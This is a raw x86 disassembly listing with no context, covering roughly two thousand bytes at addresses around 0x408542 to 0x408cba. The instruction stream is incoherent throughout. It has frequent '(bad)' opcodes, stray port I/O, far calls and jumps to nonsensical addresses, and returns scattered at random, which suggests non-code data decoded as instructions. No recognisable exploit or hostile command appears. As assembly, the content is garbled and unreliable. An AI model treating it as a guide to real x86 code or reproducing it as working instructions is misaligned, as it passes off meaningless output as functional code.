  408542:	xchg   ecx,eax
  408543:	out    dx,al
  408544:	push   edx
  408545:	cmp    eax,0xfc39c470
  40854a:	mov    dh,0xd9
  40854c:	je     0x408510
  40854e:	sbb    ebp,DWORD PTR [edi+0x5bbd877e]
  408554:	pop    ss
  408555:	push   eax
  408556:	shl    al,cl
  408558:	shr    cl,0xa1
  40855b:	mov    bh,0xd6
  40855d:	fdiv   QWORD PTR [ebx+0x45eb795c]
  408563:	pop    esi
  408564:	jns    0x40854f
  408566:	pop    ebx
  408567:	ins    BYTE PTR es:[edi],dx
  408568:	in     eax,dx
  408569:	pushf  
  40856a:	in     eax,0xa9
  40856c:	lahf   
  40856d:	clc    
  40856e:	or     BYTE PTR [ebx+0x4abb90c1],al
  408574:	test   al,0x86
  408576:	(bad)  
  408577:	jne    0x408514
  408579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40857a:	inc    esi
  40857b:	and    eax,0xc17d516a
  408580:	sub    al,0x50
  408582:	ror    BYTE PTR ds:0x3033f2a6,cl
  408588:	mov    al,ds:0x5f2e944
  40858d:	xchg   edx,eax
  40858e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40858f:	pop    edx
  408590:	xor    al,0x46
  408592:	mov    ebx,0xa76b20f5
  408597:	call   0x2441:0x8b5a74e
  40859e:	scas   eax,DWORD PTR es:[edi]
  40859f:	(bad)  
  4085a1:	(bad)  
  4085a2:	out    dx,eax
  4085a3:	pop    ebp
  4085a4:	(bad)  
  4085a5:	add    BYTE PTR [eax+0x17],dh
  4085a8:	xor    esi,eax
  4085aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085ab:	mov    edx,0x10a5372c
  4085b0:	cmc    
  4085b1:	ja     0x4085e1
  4085b3:	add    al,0x58
  4085b5:	int    0xed
  4085b7:	mov    ebp,0xd7b8ac8c
  4085bc:	adc    al,0xe0
  4085be:	inc    esi
  4085bf:	(bad)  
  4085c1:	dec    edi
  4085c2:	stc    
  4085c3:	add    DWORD PTR [edi+0x29],eax
  4085c6:	repz cmp eax,0xae38516a
  4085cc:	shr    cl,cl
  4085ce:	out    0x71,al
  4085d0:	jno    0x408561
  4085d2:	outs   dx,DWORD PTR ds:[esi]
  4085d3:	shr    BYTE PTR [edx-0x46a4f086],0x5
  4085da:	sub    al,0x5a
  4085dc:	or     esi,DWORD PTR [edx+0x1f]
  4085df:	or     bl,BYTE PTR [ebp+ecx*8+0x14068bad]
  4085e6:	ds in  eax,dx
  4085e8:	push   esi
  4085e9:	cmp    ebp,edx
  4085eb:	mov    ebx,0xc2c104b4
  4085f0:	gs mov dl,0x5a
  4085f3:	xchg   ecx,eax
  4085f4:	pop    edx
  4085f6:	retf   0x52c8
  4085f9:	test   eax,0x5f4a467e
  4085fe:	popf   
  4085ff:	rcr    BYTE PTR [eax-0x3a],cl
  408602:	pop    es
  408603:	mov    ebx,0x6785f77c
  408608:	nop
  408609:	retw   0xd7a0
  40860d:	es iret 
  40860f:	jae    0x4085f7
  408611:	repz pop ecx
  408613:	in     eax,0xb4
  408615:	mov    ch,0xd6
  408617:	xchg   edx,eax
  408618:	mov    dh,BYTE PTR es:[ebx-0x3a1bb959]
  40861f:	add    DWORD PTR [edi],ebp
  408621:	cmp    al,0xf7
  408623:	gs push ds
  408625:	js     0x40860b
  408627:	sub    DWORD PTR [esi],ebx
  408629:	jle    0x40861f
  40862b:	mov    DWORD PTR ds:0xb912e327,esp
  408631:	push   0xe355a86c
  408636:	pop    ebp
  408637:	pushf  
  408638:	cdq    
  408639:	stos   DWORD PTR es:[edi],eax
  40863a:	fadd   st(1),st
  40863c:	or     DWORD PTR ds:0x1c183089,esp
  408642:	mov    bl,0x3a
  408644:	sub    ch,BYTE PTR [ebp+0x78]
  408647:	xchg   ebp,eax
  408648:	or     eax,esp
  40864a:	in     eax,0xad
  40864c:	mov    ds:0x797c7aaf,eax
  408651:	aaa    
  408652:	inc    edi
  408653:	lods   eax,DWORD PTR ds:[esi]
  408654:	cld    
  408655:	mov    ecx,0x524c6b10
  40865a:	xchg   esp,eax
  40865b:	in     eax,0x96
  40865d:	push   esp
  40865e:	stos   BYTE PTR es:[edi],al
  40865f:	div    BYTE PTR [edx]
  408661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408662:	xchg   esp,eax
  408663:	pop    eax
  408664:	sub    al,0xb7
  408666:	outs   dx,BYTE PTR ds:[esi]
  408667:	in     eax,0xe8
  408669:	mov    ds:0xae578361,al
  40866e:	jecxz  0x4086e8
  408670:	push   0x34269130
  408675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408676:	rcl    DWORD PTR [ebx],1
  408678:	pop    ebx
  408679:	sbb    bl,BYTE PTR [edx+0x73]
  40867c:	scas   eax,DWORD PTR es:[edi]
  40867d:	pop    ebp
  40867e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40867f:	pop    ebp
  408680:	pop    esp
  408681:	jnp    0x408668
  408683:	xor    DWORD PTR [ebx],ebp
  408685:	jp     0x408682
  408687:	cmp    ebx,esi
  408689:	xlat   BYTE PTR ds:[ebx]
  40868a:	mov    ds:0x4ab6b5ac,al
  40868f:	mov    cl,0xcd
  408691:	jb     0x4086a2
  408693:	add    BYTE PTR [ecx+0x6646b25],bl
  408699:	cs test esi,esp
  40869c:	loop   0x4086f9
  40869e:	mov    cl,BYTE PTR [edi+0x69]
  4086a1:	pop    ss
  4086a2:	sti    
  4086a3:	loop   0x4086e0
  4086a5:	scas   al,BYTE PTR es:[edi]
  4086a6:	into   
  4086a7:	popa   
  4086a8:	mov    ds:0xfe32aacf,al
  4086ad:	sti    
  4086ae:	(bad)  
  4086af:	jmp    0x408708
  4086b1:	clc    
  4086b2:	into   
  4086b3:	mov    bh,0xfe
  4086b5:	cwde   
  4086b6:	jle    0x4086ff
  4086b8:	shr    ebp,cl
  4086ba:	mov    dh,0xc9
  4086bc:	xor    dh,BYTE PTR [edi]
  4086be:	dec    ebx
  4086bf:	push   edi
  4086c0:	enter  0x8bb0,0x29
  4086c4:	imul   BYTE PTR [esi+esi*1+0x23]
  4086c8:	push   ecx
  4086c9:	xchg   edx,eax
  4086ca:	in     eax,dx
  4086cb:	push   ecx
  4086cc:	xchg   edi,edx
  4086ce:	mov    edi,0x7ccf1cff
  4086d3:	cmc    
  4086d4:	dec    ebx
  4086d5:	xchg   esp,eax
  4086d6:	gs jo  0x4086bc
  4086d9:	push   ebx
  4086da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086db:	daa    
  4086dc:	scas   eax,DWORD PTR es:[edi]
  4086dd:	mov    edx,0xd5a55c5e
  4086e2:	xlat   BYTE PTR ds:[ebx]
  4086e3:	(bad)  
  4086e4:	jae    0x408693
  4086e6:	jp     0x4086ac
  4086e8:	fidiv  DWORD PTR [ecx]
  4086ea:	push   es
  4086eb:	adc    al,0x33
  4086ed:	inc    esi
  4086ee:	ret    
  4086ef:	mov    DWORD PTR ds:[edx-0x56],ecx
  4086f3:	inc    ecx
  4086f4:	inc    ebx
  4086f5:	inc    eax
  4086f6:	in     eax,dx
  4086f7:	jnp    0x408691
  4086f9:	inc    esi
  4086fa:	in     eax,dx
  4086fb:	mov    BYTE PTR [ecx-0xf106877],dl
  408701:	mov    dl,0x8e
  408703:	sub    eax,0x8bb8006b
  408708:	and    al,0x69
  40870a:	jp     0x40874e
  40870c:	or     dh,BYTE PTR [ecx]
  40870e:	mov    bl,BYTE PTR ds:0x427d649
  408714:	popa   
  408715:	sub    eax,0xb05a6fd7
  40871a:	sub    eax,0x8e5f4316
  40871f:	sub    esp,DWORD PTR [esi]
  408721:	fcom   DWORD PTR [ebx]
  408723:	loope  0x408711
  408725:	sub    ecx,edx
  408727:	lods   al,BYTE PTR ds:[esi]
  408728:	jmp    0xbb44:0xc60089b5
  40872f:	mov    ss,WORD PTR [eax-0xe]
  408732:	push   0x5b
  408734:	adc    ebp,DWORD PTR [eax+0x7ef11122]
  40873a:	adc    edx,DWORD PTR ds:0x302395b3
  408740:	iret   
  408741:	or     eax,0x9932ccd3
  408746:	pop    ecx
  408747:	fimul  WORD PTR es:[edi]
  40874a:	nop
  40874b:	out    0x51,eax
  40874d:	push   edx
  40874e:	nop
  40874f:	push   edi
  408750:	mov    al,ds:0xcdfe3955
  408755:	cwde   
  408756:	jnp    0x4087a5
  408758:	loope  0x4086e9
  40875a:	fimul  DWORD PTR [edi+0x74]
  40875d:	mov    esi,0xc0d6fce8
  408762:	cmc    
  408763:	stos   DWORD PTR es:[edi],eax
  408764:	xchg   edi,eax
  408765:	js     0x40875c
  408767:	jnp    0x4087e8
  408769:	retf   0xe7b0
  40876c:	es es int 0xf3
  408770:	jl     0x40877b
  408772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408773:	fwait
  408774:	lahf   
  408775:	cmp    al,0xcf
  408777:	leave  
  408778:	mov    dl,0x8c
  40877a:	xchg   DWORD PTR [edi],ebx
  40877c:	cmp    al,0x7
  40877e:	in     eax,0x1e
  408780:	iret   
  408781:	xrelease xchg DWORD PTR ds:0xebf8b6d5,edx
  408789:	push   eax
  40878a:	mov    edi,0x68504ad6
  40878f:	fcomp  QWORD PTR [edi+0xd]
  408792:	scas   al,BYTE PTR es:[edi]
  408793:	std    
  408794:	mov    ?,WORD PTR [eax]
  408796:	shr    DWORD PTR [eax],0x8c
  408799:	pusha  
  40879a:	adc    al,0x66
  40879c:	(bad)  
  40879d:	jo     0x408742
  40879f:	xchg   DWORD PTR [edx+ebp*4+0x31f0f252],edx
  4087a6:	(bad)  
  4087a7:	push   esp
  4087a8:	test   eax,0xf98961bf
  4087ad:	push   es
  4087ae:	add    ebp,DWORD PTR [eax]
  4087b0:	mov    ecx,0x1ac026cf
  4087b5:	add    dh,ch
  4087b7:	cs dec edi
  4087b9:	dec    eax
  4087ba:	sub    DWORD PTR [ebx+0x15],edi
  4087bd:	add    BYTE PTR [eax+0x37],bl
  4087c0:	cmp    BYTE PTR [esi],dl
  4087c2:	jmp    0xefaf8879
  4087c7:	imul   edx,DWORD PTR [eax],0x94094a09
  4087cd:	adc    cl,BYTE PTR [eax-0x54f1ea36]
  4087d3:	jnp    0x4087b9
  4087d5:	cmp    esi,ebp
  4087d7:	call   0xaeea273d
  4087dc:	mov    ch,0xd8
  4087de:	push   ds
  4087df:	call   FWORD PTR [esi-0x4b]
  4087e2:	lods   eax,DWORD PTR ds:[esi]
  4087e3:	shl    DWORD PTR [esi],0x56
  4087e6:	pop    ebp
  4087e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087e8:	push   esi
  4087e9:	mov    dh,0x79
  4087eb:	scas   al,BYTE PTR es:[edi]
  4087ec:	or     BYTE PTR [edx+ebx*4-0x23],cl
  4087f0:	mov    eax,0xb18d86ef
  4087f5:	xchg   esp,eax
  4087f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f7:	and    eax,0x39b30ccf
  4087fc:	dec    esp
  4087fd:	addr16 out dx,al
  4087ff:	jg     0x4087e7
  408801:	ret    
  408802:	xor    DWORD PTR [ecx-0x2],0xfd594d7d
  408809:	sub    DWORD PTR [edx+0x3eabfbb9],ebx
  40880f:	inc    edi
  408810:	add    al,BYTE PTR [edx+0x54]
  408813:	and    eax,0xedeec2d6
  408818:	sbb    edi,DWORD PTR [ebp+esi*8-0xb930c26]
  40881f:	pop    esp
  408820:	cli    
  408821:	ins    BYTE PTR es:[edi],dx
  408822:	pop    ecx
  408823:	xchg   esi,eax
  408824:	sub    edx,DWORD PTR ds:0xd909f9be
  40882a:	ja     0x4087b3
  40882c:	xchg   DWORD PTR [ebx-0x32],esp
  40882f:	pushf  
  408830:	fisub  DWORD PTR [ecx]
  408832:	fsubrp st(2),st
  408835:	cmp    ebx,edi
  408837:	stc    
  408838:	xor    esi,DWORD PTR [edx-0x53]
  40883b:	jmp    0x4087bd
  40883d:	adc    al,0x7d
  40883f:	pop    edi
  408840:	jne    0x4088a1
  408842:	jno    0x408871
  408844:	push   esi
  408845:	and    BYTE PTR ds:0x59ed5d55,dl
  40884b:	and    eax,DWORD PTR [eax]
  40884d:	mov    al,0x3a
  40884f:	pop    edi
  408850:	jmp    0x9f3ef84a
  408855:	iret   
  408856:	out    0xb5,eax
  408858:	mov    DWORD PTR [ebp+edi*4-0x34],edx
  40885c:	xor    bl,0xcd
  40885f:	(bad)  
  408860:	out    dx,eax
  408861:	inc    esp
  408862:	(bad)  
  408863:	add    BYTE PTR [eax+0x17],dh
  408866:	sub    ebx,ecx
  408868:	repnz popa 
  40886a:	inc    eax
  40886b:	sub    bh,ch
  40886d:	add    BYTE PTR [edi+ebp*4],cl
  408870:	dec    edx
  408871:	mov    ecx,0x270e0ca4
  408876:	sbb    dl,BYTE PTR [edx]
  408878:	inc    ecx
  408879:	mov    ds:0x9244ed24,al
  40887e:	es push 0xffffffd9
  408881:	push   cs
  408882:	mov    esi,0xf8fcc493
  408887:	mov    ss,WORD PTR [esp+edi*4-0x47]
  40888b:	dec    DWORD PTR [esi+0x65]
  40888e:	sbb    esp,DWORD PTR [eax-0x510c5890]
  408894:	xor    al,BYTE PTR [ebx]
  408896:	mov    gs,WORD PTR [eax]
  408898:	outs   dx,DWORD PTR ds:[esi]
  408899:	jno    0x40889e
  40889b:	xor    edx,0x12
  40889e:	mov    dl,0xdc
  4088a0:	inc    esi
  4088a1:	loope  0x4088e3
  4088a3:	xchg   edi,eax
  4088a4:	adc    eax,0x720a1ba8
  4088a9:	push   esp
  4088aa:	(bad)  
  4088ab:	pop    edi
  4088ac:	frstor [edx-0x2c]
  4088af:	mov    ebx,0x2af5e936
  4088b4:	jae    0x4088d8
  4088b6:	sub    bl,ah
  4088b8:	clc    
  4088b9:	lock xor BYTE PTR [edi],0x5e
  4088bd:	stc    
  4088be:	xor    ebx,DWORD PTR [edx+0x2a]
  4088c1:	scas   eax,DWORD PTR es:[edi]
  4088c2:	sub    DWORD PTR [edi+0x18],edi
  4088c5:	data16 jmp 0x40889e
  4088c8:	cmp    BYTE PTR [eax-0x6b],dl
  4088cb:	shl    BYTE PTR [edi],cl
  4088cd:	inc    ebx
  4088ce:	imul   eax,ecx,0x39e796e1
  4088d4:	addr16 dec edi
  4088d6:	outs   dx,DWORD PTR ds:[esi]
  4088d7:	jae    0x4088ba
  4088d9:	int    0x97
  4088db:	fnstcw WORD PTR [ebx+0x3b096b7d]
  4088e1:	arpl   ax,bp
  4088e3:	scas   al,BYTE PTR es:[edi]
  4088e4:	sub    DWORD PTR [ebx],edi
  4088e6:	mov    ecx,DWORD PTR [eax+ecx*8]
  4088e9:	and    eax,0x2009a553
  4088ee:	shl    DWORD PTR [eax],1
  4088f0:	and    al,0x17
  4088f2:	sub    DWORD PTR [ecx],esi
  4088f4:	mov    ah,0x5b
  4088f6:	sub    DWORD PTR [ebp+0x59],esp
  4088f9:	(bad)  
  4088fa:	sub    BYTE PTR [edi+0x73],bh
  4088fd:	scas   al,BYTE PTR es:[edi]
  4088fe:	ret    
  4088ff:	mov    ds:0x4c9628,al
  408904:	and    esp,eax
  408906:	jne    0x408947
  408908:	scas   eax,DWORD PTR es:[edi]
  408909:	loopne 0x408988
  40890b:	xchg   ebx,eax
  40890c:	mov    ch,0x13
  40890e:	lock mov cs:0x34387a94,al
  408915:	and    al,0x5b
  408917:	(bad)  
  408919:	int    0x5b
  40891b:	mov    ebx,0x54681c1c
  408920:	mov    ds:0xad0476e8,al
  408925:	dec    esi
  408926:	inc    edx
  408927:	pop    ecx
  408928:	ret    0x666c
  40892b:	enter  0xeb0a,0xd7
  40892f:	in     eax,dx
  408930:	mov    ah,0x54
  408932:	ss mov esi,0x34494df5
  408938:	repz in ax,dx
  40893b:	jb     0x4088f9
  40893d:	retf   
  40893e:	fiadd  DWORD PTR [ebp+0x5e2f7069]
  408944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408945:	sub    ah,BYTE PTR [edi-0x3a319120]
  40894b:	cmp    esp,ebp
  40894d:	in     eax,dx
  40894e:	inc    esi
  40894f:	jecxz  0x408961
  408951:	ret    0x457d
  408954:	fidivr WORD PTR [eax]
  408956:	imul   eax,DWORD PTR [eiz*2+0x5a047789],0xffffffa6
  40895e:	jae    0x40898a
  408960:	push   es
  408961:	nop
  408962:	jnp    0x4089ab
  408964:	mov    al,ds:0xe24efe12
  408969:	leave  
  40896a:	mov    DWORD PTR [edx],ebx
  40896c:	push   edi
  40896d:	stos   BYTE PTR es:[edi],al
  40896e:	mov    ch,0xeb
  408970:	adc    BYTE PTR [edi+0x3f],bh
  408973:	ret    0x1819
  408976:	bound  ebx,QWORD PTR [ecx+eax*2]
  408979:	out    0xb3,al
  40897b:	or     edi,ebx
  40897d:	jge    0x40897d
  40897f:	stos   DWORD PTR es:[edi],eax
  408980:	hlt    
  408981:	sar    BYTE PTR [ecx+esi*1+0x29],cl
  408985:	mov    edi,DWORD PTR [edi+0x3f]
  408988:	aad    0x31
  40898a:	lea    esi,[eax+0x82cd35a]
  408990:	fild   DWORD PTR [ecx]
  408992:	mov    edx,0xc3d30e9d
  408997:	jge    0x408947
  408999:	pop    edi
  40899a:	mov    ebx,0x45b868ca
  40899f:	xchg   edx,eax
  4089a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089a1:	cmc    
  4089a2:	xlat   BYTE PTR ds:[ebx]
  4089a3:	sar    BYTE PTR [edi+ebp*2-0x178e6081],cl
  4089aa:	xor    BYTE PTR [esi+0x46],bh
  4089ad:	dec    ebx
  4089ae:	mov    ebp,0x39e78fe7
  4089b3:	sub    BYTE PTR [ebp+0x461893a5],dh
  4089b9:	mov    ds:0x5be4e551,eax
  4089be:	jp     0x408a1e
  4089c0:	lahf   
  4089c1:	adc    BYTE PTR [ebp+eiz*2-0x7fe35527],dl
  4089c8:	or     eax,eax
  4089ca:	jge    0x408969
  4089cc:	cmp    al,0x74
  4089ce:	or     eax,0xb5884700
  4089d3:	div    BYTE PTR [ecx+ebx*2-0x6a]
  4089d7:	lahf   
  4089d8:	js     0x4089d8
  4089da:	pop    ebx
  4089db:	(bad)  
  4089dd:	fwait
  4089de:	sti    
  4089df:	jnp    0x408a5c
  4089e1:	outs   dx,BYTE PTR ds:[esi]
  4089e2:	sbb    eax,0x90422080
  4089e7:	test   al,0x84
  4089e9:	sbb    edx,edi
  4089eb:	outs   dx,DWORD PTR ds:[esi]
  4089ec:	mov    cl,0xb7
  4089ee:	scas   eax,DWORD PTR es:[edi]
  4089ef:	dec    ecx
  4089f0:	xchg   ebp,eax
  4089f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f2:	fisttp WORD PTR [edi-0x28]
  4089f5:	fsubr  QWORD PTR [ebx+edx*2+0x6a]
  4089f9:	mov    eax,0xc6605bbd
  4089fe:	add    eax,0x19434e59
  408a03:	(bad)  
  408a04:	push   edx
  408a05:	loop   0x4089af
  408a07:	retf   
  408a08:	ins    BYTE PTR es:[edi],dx
  408a09:	jp     0x4089f5
  408a0b:	sub    eax,0x8af736de
  408a10:	imul   eax,DWORD PTR [ebx-0x15],0xffffffb3
  408a14:	lods   al,BYTE PTR ds:[esi]
  408a15:	aam    0x98
  408a17:	shl    BYTE PTR [ebp-0x3b],1
  408a1a:	cmp    DWORD PTR [edi+0x2c],0x51
  408a1e:	mov    esi,DWORD PTR [ebp-0x323a09d5]
  408a24:	mov    bh,0xc1
  408a26:	or     BYTE PTR [edx+0x4583751c],ch
  408a2c:	mov    eax,0x7585f431
  408a31:	jle    0x4089b3
  408a33:	test   eax,0x4c133261
  408a38:	xor    ecx,eax
  408a3a:	jae    0x408a1d
  408a3c:	xor    ah,al
  408a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a3f:	pop    es
  408a40:	sbb    eax,0xe7638922
  408a46:	int    0xf4
  408a48:	xor    DWORD PTR [eax+0x45],0xffffffbb
  408a4c:	jp     0x408acd
  408a4e:	cld    
  408a4f:	mov    BYTE PTR [ebp-0x67],ah
  408a52:	repz retf 0xcf4b
  408a56:	and    ebp,ecx
  408a58:	cwde   
  408a59:	dec    esi
  408a5a:	xor    DWORD PTR [bp+si+0x572c],0x29
  408a60:	dec    ecx
  408a61:	lods   eax,DWORD PTR ds:[esi]
  408a62:	xchg   edi,eax
  408a63:	pop    DWORD PTR [ecx]
  408a65:	mov    al,ds:0x924f4b39
  408a6a:	and    al,0x2e
  408a6c:	out    0xbe,eax
  408a6e:	sub    BYTE PTR [eax-0x18b3d8b4],bl
  408a74:	jae    0x408a70
  408a76:	sub    dh,BYTE PTR [ecx-0x11]
  408a79:	mov    edx,0x57cde0a1
  408a7e:	mov    eax,0x3162b184
  408a83:	fsubr  DWORD PTR [eax]
  408a85:	test   BYTE PTR [ecx+0x6e83d184],0x7e
  408a8c:	inc    esp
  408a8d:	adc    DWORD PTR [edx+0x5],0xffffffad
  408a91:	push   esi
  408a92:	stos   DWORD PTR es:[edi],eax
  408a93:	retf   0x5801
  408a96:	xchg   ebp,eax
  408a97:	in     al,dx
  408a98:	push   ebx
  408a99:	adc    al,0x5
  408a9b:	jnp    0x408b18
  408a9d:	jnp    0x408aea
  408a9f:	pusha  
  408aa0:	add    eax,0xbf9bfabc
  408aa5:	stc    
  408aa6:	fwait
  408aa7:	dec    ebx
  408aa8:	jbe    0x408a6b
  408aaa:	cmp    edx,DWORD PTR [ecx-0x5dbbffcb]
  408ab0:	retf   
  408ab1:	repnz sub al,0xf0
  408ab4:	repz push ss
  408ab6:	(bad)  
  408ab7:	stos   BYTE PTR es:[edi],al
  408ab8:	sar    edx,1
  408aba:	scas   eax,DWORD PTR es:[edi]
  408abb:	imul   ebp,DWORD PTR [ebp+0x1f2d5a77],0xffffffe2
  408ac2:	mov    edx,DWORD PTR [eax+ecx*2]
  408ac5:	clc    
  408ac6:	or     al,al
  408ac8:	lea    ebx,[ebx+0x454ac9b7]
  408ace:	call   0xb0e1:0x84edda0a
  408ad5:	or     eax,0xb2028a08
  408ada:	mov    ecx,0xcbb42f26
  408adf:	adc    BYTE PTR [ecx+esi*2-0x7cb4f051],dh
  408ae6:	outs   dx,BYTE PTR ds:[esi]
  408ae7:	push   0x12
  408ae9:	shl    edi,cl
  408aeb:	mov    ebx,0xb837ed8d
  408af0:	test   DWORD PTR [edx-0x78],eax
  408af3:	inc    eax
  408af4:	mov    eax,ds:0x26c2a19
  408af9:	inc    edi
  408afa:	jl     0x408a89
  408afc:	mov    eax,0xdd75b35
  408b01:	push   edi
  408b02:	inc    ebp
  408b03:	xchg   esi,eax
  408b04:	cdq    
  408b05:	dec    edx
  408b06:	mov    BYTE PTR [eax+ebp*8],al
  408b09:	shl    BYTE PTR [ebp-0x3e5e78fb],cl
  408b0f:	pop    ecx
  408b10:	out    dx,al
  408b11:	sahf   
  408b12:	mov    ecx,0x2dee2ed4
  408b17:	inc    esp
  408b18:	cmp    eax,0x9e53581c
  408b1d:	jo     0x408ae5
  408b1f:	inc    esi
  408b20:	cwde   
  408b21:	out    dx,eax
  408b22:	outs   dx,BYTE PTR ds:[esi]
  408b23:	mov    ds:0xaf1bc975,al
  408b28:	cmp    al,0x4f
  408b2a:	bound  ecx,QWORD PTR [edi]
  408b2c:	sbb    DWORD PTR [esi+ecx*1+0x29],ebp
  408b30:	mov    al,dl
  408b32:	aas    
  408b33:	mov    dh,0xa8
  408b35:	jge    0x408b19
  408b37:	ins    DWORD PTR es:[edi],dx
  408b38:	int    0xef
  408b3a:	mov    eax,ds:0xc1660dc7
  408b3f:	pusha  
  408b40:	xor    al,ah
  408b42:	xchg   ebp,eax
  408b43:	push   edi
  408b44:	ffreep st(0)
  408b46:	fadd   DWORD PTR [esp+eax*2+0x4d9dd9b9]
  408b4d:	push   eax
  408b4e:	enter  0x7dc6,0xad
  408b52:	retf   0x8841
  408b55:	stos   DWORD PTR es:[edi],eax
  408b56:	or     edx,DWORD PTR [ebx]
  408b58:	jns    0x408bbb
  408b5a:	cmp    al,0xf5
  408b5c:	scas   eax,DWORD PTR es:[edi]
  408b5d:	out    0x1b,al
  408b5f:	lock ret 
  408b61:	xchg   DWORD PTR [ebp+0x56554836],ecx
  408b67:	push   cs
  408b68:	mov    edi,0x3eb6dcea
  408b6d:	inc    edi
  408b6e:	mov    al,ds:0x2e1c51f3
  408b73:	mov    cl,0x17
  408b75:	loopne 0x408b49
  408b77:	mov    ebp,0xcbbdd6d5
  408b7c:	jg     0x408b4f
  408b7e:	add    BYTE PTR [eax+0x16],dl
  408b81:	inc    ebp
  408b82:	pop    es
  408b83:	cmp    BYTE PTR [ecx],ch
  408b85:	test   al,bh
  408b87:	xchg   esp,eax
  408b88:	mov    ch,0xf6
  408b8a:	outs   dx,DWORD PTR ds:[esi]
  408b8b:	sbb    ah,BYTE PTR [ebx+0x3e]
  408b8e:	lods   al,BYTE PTR gs:[esi]
  408b90:	sbb    eax,0xb3d54f59
  408b95:	sub    al,0x27
  408b97:	iret   
  408b98:	repz fisub DWORD PTR [eax]
  408b9b:	and    BYTE PTR [ebx],cl
  408b9d:	dec    eax
  408b9e:	dec    edi
  408b9f:	shr    DWORD PTR [esi-0x23],cl
  408ba2:	fcmovb st,st(5)
  408ba4:	rol    BYTE PTR [esi+0x29],cl
  408ba7:	inc    ecx
  408ba8:	stos   DWORD PTR es:[edi],eax
  408ba9:	and    eax,0x5413f419
  408bae:	mov    ds:0xe335cd98,al
  408bb3:	jno    0x408b76
  408bb5:	fs scas al,BYTE PTR es:[edi]
  408bb7:	shl    esi,1
  408bb9:	outs   dx,BYTE PTR ds:[esi]
  408bba:	aam    0x3d
  408bbc:	ds jae 0x408b72
  408bbf:	imul   esi,ecx,0x4a
  408bc2:	pop    ebx
  408bc3:	sub    DWORD PTR [ebx+0x0],esp
  408bc6:	test   DWORD PTR ds:0x3cedddc7,edx
  408bcc:	dec    ebx
  408bcd:	mov    ?,WORD PTR gs:[eax]
  408bd0:	lods   al,BYTE PTR cs:[esi]
  408bd2:	adc    eax,0x82809b60
  408bd7:	xor    eax,DWORD PTR [ebx]
  408bd9:	lods   al,BYTE PTR ds:[esi]
  408bda:	inc    ecx
  408bdb:	imul   ecx,DWORD PTR [ecx+0x51],0xffffffba
  408bdf:	jno    0x408be2
  408be1:	and    DWORD PTR [eax+ebx*4],edx
  408be4:	jnp    0x408be6
  408be6:	dec    eax
  408be7:	xchg   ebx,eax
  408be8:	test   DWORD PTR ds:0xd363384c,ebx
  408bee:	(bad)  
  408bf0:	push   0x29aa5b58
  408bf5:	mov    edi,0x7fefd5e1
  408bfa:	mov    edi,DWORD PTR [edx+esi*2-0x6f]
  408bfe:	int    0x61
  408c00:	scas   eax,DWORD PTR es:[edi]
  408c01:	(bad)  
  408c02:	repz fisttp WORD PTR [ebp-0x17]
  408c06:	jecxz  0x408bf1
  408c08:	mov    bh,0x42
  408c0a:	(bad)
  408c0e:	fucomi st,st(5)
  408c10:	mov    dl,0xbf
  408c12:	mov    edi,0xbdaf2bcf
  408c17:	lds    ebp,FWORD PTR [eax-0x19]
  408c1a:	and    DWORD PTR [edx],edi
  408c1c:	fnstsw WORD PTR [esi]
  408c1e:	push   edx
  408c1f:	sub    al,BYTE PTR [edx+eiz*4]
  408c22:	call   0xee7:0xab34407f
  408c29:	bound  esp,QWORD PTR [ebx]
  408c2b:	jo     0x408c38
  408c2d:	aam    0x3f
  408c2f:	xor    BYTE PTR [ecx],al
  408c31:	ins    DWORD PTR es:[edi],dx
  408c32:	cmp    eax,0xd19a9408
  408c37:	mov    DWORD PTR [ecx],eax
  408c39:	push   edx
  408c3a:	sub    DWORD PTR [edi+eax*1-0x7f66aa50],ecx
  408c41:	pop    edx
  408c42:	jmp    0x408be9
  408c44:	cdq    
  408c45:	test   BYTE PTR [ebp-0x621ffe54],bh
  408c4b:	dec    eax
  408c4c:	xchg   esi,eax
  408c4d:	gs daa 
  408c4f:	add    eax,0xbf820cfc
  408c54:	add    dl,ah
  408c56:	jno    0x408cc5
  408c58:	hlt    
  408c59:	pop    es
  408c5a:	lods   al,BYTE PTR ds:[esi]
  408c5b:	mov    ch,0xf
  408c5d:	pop    ebx
  408c5e:	imul   eax,DWORD PTR [edi],0xffffffd6
  408c61:	pop    edx
  408c62:	xchg   edi,eax
  408c63:	cdq    
  408c64:	(bad)
  408c67:	xor    ebx,DWORD PTR [ebx+0x24c5814e]
  408c6d:	and    ch,dl
  408c6f:	dec    ebx
  408c70:	xchg   edx,eax
  408c71:	adc    ah,BYTE PTR [ebx+0x34]
  408c74:	out    0xdf,eax
  408c76:	mov    edx,0x920fb581
  408c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c7c:	shr    BYTE PTR [ecx-0x5],1
  408c7f:	pop    ecx
  408c80:	pusha  
  408c81:	cli    
  408c82:	sub    eax,0x3e32d2ca
  408c87:	sub    al,0x19
  408c89:	dec    edi
  408c8a:	dec    edx
  408c8b:	mov    ah,0x6e
  408c8d:	div    BYTE PTR [esi+0x8f82521]
  408c93:	pusha  
  408c94:	mov    al,0x96
  408c96:	push   0x66
  408c98:	lahf   
  408c99:	and    eax,0xf1255e25
  408c9e:	stc    
  408c9f:	fwait
  408ca0:	out    0x8c,eax
  408ca2:	push   es
  408ca3:	push   es
  408ca4:	sub    eax,0x7de37bf9
  408ca9:	dec    ebp
  408caa:	push   eax
  408cab:	icebp  
  408cac:	fisttp DWORD PTR [ebp+ebp*4+0x142eb2ef]
  408cb3:	pop    eax
  408cb4:	push   0x4b
  408cb6:	xchg   esi,eax
  408cb7:	sbb    DWORD PTR [esi+0x73],esp
  408cba:	shl    ecx,0xcc
